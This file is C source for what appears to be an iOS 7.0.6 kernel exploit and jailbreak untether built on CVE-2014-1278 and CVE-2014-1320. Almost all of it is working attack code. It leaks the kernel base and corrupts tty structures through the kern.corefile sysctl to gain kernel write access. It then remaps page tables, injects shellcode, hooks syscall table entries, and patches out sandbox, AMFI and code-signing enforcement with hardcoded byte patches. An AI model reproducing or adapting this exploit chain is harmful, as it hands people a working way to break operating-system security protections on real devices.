/*
 * Copyright (c) 2014, winocm. <winocm@icloud.com>. All rights reserved.
 */
/*
 * Pieces of this from geohot's proof of concept, just fully armed into an
 * untether. This is not meant to be stable. Just something I thought of
 * while bored to fully show off the power of page table hackery in something
 * that's remotely usable. This is for iPhone3,1_11B651_7.0.6, not really
 * anything else.
 *
 * If you brick your device, that is not my problem, that is *your* problem.
 *
 * Yes, I was lazy and I used static offsets, watcha gonna do about it?
 *
 * THIS IS VERY UNRELIABLE BUT YOU SHOULD BE ABLE TO GRASP THE CONCEPT
 * OF WHAT'S HAPPENING HERE.
 *
 * Utilizes:
 *  - CVE-2014-1278 - A local user may be able to cause an unexpected system termination or arbitrary code execution in the kernel.
 *  - CVE-2014-1320 - A local user can read kernel pointers, which can be used to bypass kernel address space layout randomization.
 */

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach_types.h>
#include <stdint.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/sysctl.h>

#include "page_protos.h"
#include "iokit_lite.h"

extern void *shellcode_begin, *shellcode_end;
extern void *sandbox_helper_hook, *sandbox_helper_hook_end;
extern void *syscall0_trampoline_handler;
extern void *dyld_helper_hook, *dyld_helper_hook64;
extern uint32_t stat_offset, stat64_offset, copyinstr_offset, kernel_base;


typedef struct {
    uint32_t boot_args_offset;
    uint32_t kernel_base;
    uint32_t boot_args_kern_offset;

    uint32_t copyinstr_offset;
    uint32_t stat_offset;
    uint32_t stat64_offset;
    uint32_t sysent_0_offset;

    uint32_t stat64_sysent_off;
    uint32_t stat_sysent_off;

    uint32_t corefile_sysctl;
    uint32_t ptsd_exec;
    uint32_t ttb_base;

    uint32_t I_can_has_debugger;
    uint32_t I_can_has_debugger_patch;
    uint32_t Sandbox_patch;
    uint32_t Sandbox_builtin_profile_patch;
    uint32_t Opensn0w_patch1;
    uint32_t Opensn0w_patch2;
    uint32_t Opensn0w_patch3;
    uint32_t Opensn0w_patch4;
    uint32_t Opensn0w_MSFix_patch;
    uint32_t AmfiFlags;
    uint32_t Shift_boot_args;

} kernel_offsets;

kernel_offsets offsets = {
    .copyinstr_offset = 0x1FDB4,
    .stat64_offset = 0x135CA9,
    .stat_offset = 0x135C3D,
    .corefile_sysctl = 0x334AE4,
    .ptsd_exec = 0x27A11D,
    .boot_args_kern_offset = 0xE2F000,
    .stat_sysent_off = 0x31E4C4,
    .stat64_sysent_off = 0x31F07C,
    .sysent_0_offset = 0x31D614,
    .ttb_base = 0xE34000,

    .I_can_has_debugger = 0x37B2B4,
    .I_can_has_debugger_patch = 0xA29D6,
    .Sandbox_patch = 0x89AEF0,
    .Sandbox_builtin_profile_patch = 0x89D194,
    .Opensn0w_patch1 = 0xF40AC,
    .Opensn0w_patch2 = 0x131374,
    .Opensn0w_patch3 = 0x295EC8, /* TaskForPid */
    .Opensn0w_patch4 = 0x7BF9DC, /* Img3?? */
    .Opensn0w_MSFix_patch = 0xEECEC,
    .AmfiFlags = 0x7D2B38,
};

static uint32_t ttb_template[TTB_SIZE] = {};
static void* ttb_template_ptr = &ttb_template[0];

static uint32_t
get_kernel_base_boot_args(void)
{
    CFStringRef parameter = CFSTR("IOPlatformArgs");
    CFDataRef data;

    io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
    if (platformExpert)
    {
        data = IORegistryEntryCreateCFProperty(platformExpert,
                                               parameter,
                                               kCFAllocatorDefault, 0);
    }

    IOObjectRelease(platformExpert);
    CFIndex bufferLength = CFDataGetLength(data);  
    UInt8 *buffer = malloc(bufferLength);
    CFDataGetBytes(data, CFRangeMake(0,bufferLength), (UInt8*) buffer);

    typedef struct {
        uint32_t deviceTreeP;
        uint32_t bootArgs;
        uint32_t zero;
        uint32_t zero_1;
    } platformArgs;
    platformArgs IOPlatformArgs;
    bcopy(buffer, &IOPlatformArgs, sizeof(IOPlatformArgs));

    return IOPlatformArgs.bootArgs;
}

static void
generate_ttb_entries(void)
{
    uint32_t vaddr, vaddr_end, paddr, i;
 
    paddr = PHYS_OFF;
    vaddr = SHADOWMAP_BEGIN;
    vaddr_end = SHADOWMAP_END;
 
    for(i = vaddr; i <= vaddr_end; i += SHADOWMAP_GRANULARITY, paddr += SHADOWMAP_GRANULARITY) {
        printf("ProtoTTE: 0x%08x for VA 0x%08x -> PA 0x%08x\n", L1_PROTO_TTE(paddr), i, paddr);
        ttb_template[TTB_OFFSET(i) >> PFN_SHIFT] = L1_PROTO_TTE(paddr);
    }
 
    printf("TTE offset begin for shadowmap: 0x%08x\n"
           "TTE offset end for shadowmap:   0x%08x\n"
           "TTE size:                       0x%08x\n",
           SHADOWMAP_BEGIN_OFF, SHADOWMAP_END_OFF, SHADOWMAP_SIZE);
 
    return;
}
 
#define DMPSIZE            0xF00000

static void
add_write_clist(int *faketty) {
    int dump_addr = offsets.ttb_base + SHADOWMAP_BEGIN_OFF; /* kern uuid */
    faketty[0] = 0; faketty[1] = 0x400;
    faketty[2] = dump_addr; faketty[3] = dump_addr; faketty[4] = dump_addr; faketty[5] = dump_addr + 0x400;
    faketty[6] = 0; faketty[7] = 0;
}

static void
enable_wdt(int num)
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOWatchDogTimer"));
    uint32_t number = num;
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &number);
    IORegistryEntrySetCFProperties(service, n);
    IOObjectRelease(service);
}

static void
disable_wdt(void)
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOWatchDogTimer"));
    uint32_t number = 0;
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &number);
    IORegistryEntrySetCFProperties(service, n);
    IOObjectRelease(service);
}

int
main(__unused int argc, __unused char* argv[])
{
    uint32_t shellcode_size = (uintptr_t)&shellcode_end - (uintptr_t)&shellcode_begin;
    uint32_t syscall0_trampoline_off = (uintptr_t)&syscall0_trampoline_handler - (uintptr_t)&shellcode_begin;
    uint32_t stat_sysent_off = (uintptr_t)&dyld_helper_hook - (uintptr_t)&shellcode_begin;
    uint32_t stat_sysent64_off = (uintptr_t)&dyld_helper_hook64 - (uintptr_t)&shellcode_begin;

    generate_ttb_entries();

    printf("kernel_boot_args: 0x%08x\n", get_kernel_base_boot_args());
    offsets.boot_args_offset = get_kernel_base_boot_args();
    offsets.kernel_base = offsets.boot_args_offset - offsets.boot_args_kern_offset;
    kernel_base = offsets.kernel_base;
    printf("kernel_base: 0x%08x\n", kernel_base);

    printf("\nSlidden addresses ... \n");

    offsets.corefile_sysctl += kernel_base;
    offsets.ptsd_exec += kernel_base;
    offsets.ttb_base += kernel_base;
    offsets.stat_offset += kernel_base;
    offsets.stat64_offset += kernel_base;

    stat64_offset = offsets.stat64_offset;
    stat_offset = offsets.stat_offset;

#define doPrintOffset(var) \
    printf("\"%s\" = 0x%08x\n", #var, var);

    doPrintOffset(offsets.corefile_sysctl);
    doPrintOffset(offsets.ptsd_exec);
    doPrintOffset(offsets.ttb_base);

    printf("\nShadowed addresses ...\n");

    offsets.stat_sysent_off += SHADOWMAP_BEGIN;
    offsets.stat64_sysent_off += SHADOWMAP_BEGIN;
    offsets.sysent_0_offset += SHADOWMAP_BEGIN;

    offsets.Sandbox_patch += SHADOWMAP_BEGIN;
    offsets.Sandbox_builtin_profile_patch += SHADOWMAP_BEGIN;
    offsets.I_can_has_debugger += SHADOWMAP_BEGIN;
    offsets.I_can_has_debugger_patch += SHADOWMAP_BEGIN;
    offsets.Opensn0w_patch1 += SHADOWMAP_BEGIN;
    offsets.Opensn0w_patch2 += SHADOWMAP_BEGIN;
    offsets.Opensn0w_patch3 += SHADOWMAP_BEGIN;
    offsets.Opensn0w_patch4 += SHADOWMAP_BEGIN;
    offsets.Opensn0w_MSFix_patch += SHADOWMAP_BEGIN;
    offsets.AmfiFlags += SHADOWMAP_BEGIN;

    offsets.Shift_boot_args = offsets.boot_args_offset - offsets.kernel_base + SHADOWMAP_BEGIN;

    doPrintOffset(offsets.stat_offset);
    doPrintOffset(offsets.stat64_offset);
    doPrintOffset(offsets.Sandbox_patch);
    doPrintOffset(offsets.Sandbox_builtin_profile_patch);
    doPrintOffset(offsets.I_can_has_debugger);
    doPrintOffset(offsets.I_can_has_debugger_patch);
    doPrintOffset(offsets.Opensn0w_patch1);
    doPrintOffset(offsets.Opensn0w_patch2);
    doPrintOffset(offsets.Opensn0w_patch3);
    doPrintOffset(offsets.Opensn0w_patch4);
    doPrintOffset(offsets.Opensn0w_MSFix_patch);
    doPrintOffset(offsets.Shift_boot_args);
    doPrintOffset(offsets.AmfiFlags);

    printf("\nshellcode_size: 0x%08x\n", shellcode_size);
    printf("syscall0_trampoline_off: 0x%08x\n", syscall0_trampoline_off);

    /* Set up the WDT here. */
    enable_wdt(15);

    /* Addresses calculated. geohot code here */
    int faketty[0x40], i = 0;
    memset(faketty, 0, sizeof(faketty));
    faketty[2] = 0x22;
    faketty[0xEC/4] = offsets.ptsd_exec;
    add_write_clist(&faketty[3]);
    add_write_clist(&faketty[0xb]);
    add_write_clist(&faketty[0x13]);

    int ret = sysctlbyname("kern.corefile", NULL, NULL, faketty, sizeof(faketty));
    printf("sysctl returned %d\n", ret);

    /* tty alloc should go to 0x140, and we hope the array is in the middle of ttys */
    /* if more than 8 are alloced this will fail */
    /* slots are 0x180 big, so tty starts at +0x180 */
    for (i = 0; i < 0x138/4; i++) {
        int fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        grantpt(fd);
        unlockpt(fd);
        int pfd = open(ptsname(fd), O_RDWR);
   
        /* now that it's open we can write */
        int writedata[2];
        writedata[0] = offsets.corefile_sysctl;
        writedata[1] = 0xFFFFFFFF;
   
        ret = write(fd, writedata, 8);
   
        printf("got %d %s %d %d\n", fd, ptsname(fd), ret, pfd);
    }
   
    /* ok, when the alloc is at 0x304 the new raw ptr is at 0x498, 0x194 apart */
    ret = mknod("/dev/crash", S_IFCHR | 0666, makedev(16, 0x194/4));
    printf("mknod returned %d\n", ret);
   
    /* i open at the close */
    int crashfd = open("/dev/crash", O_RDWR|O_NOCTTY|O_NONBLOCK);
    printf("open returned %d %d\n", crashfd, errno);
    if(errno == -1)
        enable_wdt(3);

    /* Write the TTE entries. */
    ret = write(crashfd, (char*)ttb_template_ptr + SHADOWMAP_BEGIN_OFF, SHADOWMAP_SIZE);
    printf("write returned %d\n", ret);
    if(errno == -1)
        enable_wdt(3);

    /* Disable WDT */
    disable_wdt();

    /* Verify. */
    printf("0x%08x\n", *(volatile uint32_t*)SHADOWMAP_BEGIN);
    printf("0x%08x\n", *(volatile uint32_t*)SHADOWMAP_BEGIN + 0x1000);

    /* never really bothered to test this part properly till the end, addresses do get remapped though.. */
    /* 
     * technically, at this point, you can really do anything you want with the
     * remapped memory, I'm just way too tired to test this properly, and this
     * thing was meant to be a fun 'side project of the day'.
     */

    printf("hookaddrs\n");
    printf("0x%08x\n", kernel_base + 0xA00 + stat_sysent_off);
    printf("0x%08x\n", kernel_base + 0xA00 + stat_sysent64_off);
    printf("0x%08x\n", kernel_base + 0xA00 + syscall0_trampoline_off);
    printf("0x%08x\n", SHADOWMAP_BEGIN + 0xA00 + stat_sysent_off);
    printf("0x%08x\n", SHADOWMAP_BEGIN + 0xA00 + stat_sysent64_off);
    printf("0x%08x\n", SHADOWMAP_BEGIN + 0xA00 + syscall0_trampoline_off);

    /* Now, copy in the shellcode. */
    bcopy((char*)&shellcode_begin, (void*)SHADOWMAP_BEGIN + 0xA00, shellcode_size);

    /* Set up hooks. */
    *(volatile uint32_t*)offsets.stat_sysent_off = kernel_base + 0xA00 + stat_sysent_off;
    *(volatile uint32_t*)offsets.stat64_sysent_off = kernel_base + 0xA00 + stat_sysent64_off;
    *(volatile uint32_t*)offsets.sysent_0_offset = kernel_base + 0xA00 + syscall0_trampoline_off;

    /* Hooks done. Patch kernel. */
    uint32_t addr = offsets.boot_args_offset - offsets.kernel_base + SHADOWMAP_BEGIN + 0x38;
    strcpy((char*)addr, "amfi=0xff cs_enforcement_disable=1 this_isnt_evasi0n7=1");
    *(volatile uint32_t*)offsets.AmfiFlags = 1;
    *(volatile uint32_t*)offsets.I_can_has_debugger = 1;

    char I_can_has_debugger_patch[] = {0x78, 0x44, 0x01, 0x20, 0x01, 0x20, 0x70, 0x47};
    char Sandbox_patch[] = {0x1E, 0xB5, 0x00, 0x21, 0x01, 0x60, 0x18, 0x21, 0x01, 0x71, 0x1E, 0xBD, 0x9B, 0x46, 0xDF, 0xF8};
    char Sandbox_builtin_profile_patch[] = {0x78, 0x44, 0x00, 0x68, 0x00, 0x78, 0x10, 0xF0, 0x04, 0x0F};
    char Opensn0w_patch1[] = {0x0a, 0x95, 0x05, 0xd0, 0x04, 0x22, 0xb9, 0xf1, 0x00, 0x0f, 0x23, 0xd1, 0xf8, 0x68, 0x08, 0xb3};
    char Opensn0w_patch2[] = {0x15, 0xf0, 0x01, 0x0f, 0x01, 0xf0, 0x22, 0x80, 0x02, 0xe0, 0x25, 0x46, 0x00, 0xe0, 0x25, 0x46};
    char Opensn0w_patch3[] = {0x00, 0x21, 0x02, 0x91, 0x01, 0x91, 0xbb, 0xf1, 0x00, 0x0f, 0x00, 0xf0, 0xba, 0x80};
    char Opensn0w_patch4[] = {0x91, 0x42, 0x02, 0xbf, 0x0d, 0xf5, 0x46, 0x7d, 0xbd, 0xe8, 0x00, 0x0d, 0xf0, 0xbd, 0x02, 0xf0};
    char Opensn0w_MSFix_patch[] = {0x10, 0xF4, 0x00, 0x2F, 0x15, 0xD1, 0xBA, 0x69};

    bcopy(I_can_has_debugger_patch, (void*)offsets.I_can_has_debugger_patch, sizeof(I_can_has_debugger_patch));
    bcopy(Sandbox_patch, (void*)offsets.Sandbox_patch, sizeof(Sandbox_patch));
    bcopy(Sandbox_builtin_profile_patch, (void*)offsets.Sandbox_builtin_profile_patch, sizeof(Sandbox_builtin_profile_patch));
    bcopy(I_can_has_debugger_patch, (void*)offsets.I_can_has_debugger_patch, sizeof(I_can_has_debugger_patch));
    bcopy(Opensn0w_patch1, (void*)offsets.Opensn0w_patch1, sizeof(Opensn0w_patch1));
    bcopy(Opensn0w_patch2, (void*)offsets.Opensn0w_patch2, sizeof(Opensn0w_patch2));
    bcopy(Opensn0w_patch3, (void*)offsets.Opensn0w_patch3, sizeof(Opensn0w_patch3));
    bcopy(Opensn0w_patch4, (void*)offsets.Opensn0w_patch4, sizeof(Opensn0w_patch4));
    bcopy(Opensn0w_MSFix_patch, (void*)offsets.Opensn0w_MSFix_patch, sizeof(Opensn0w_MSFix_patch));

    /* Zero out ourselves. */
    bzero((void*)offsets.ttb_base - kernel_base + SHADOWMAP_BEGIN, SHADOWMAP_SIZE);
    syscall(0, 1);
    syscall(0, 0);

    /* Ughhhh. */
    char* args[] = {"boostrap", "-S", "system", NULL};
    execve("/bin/launchctl", args, NULL);

    return 0;
}
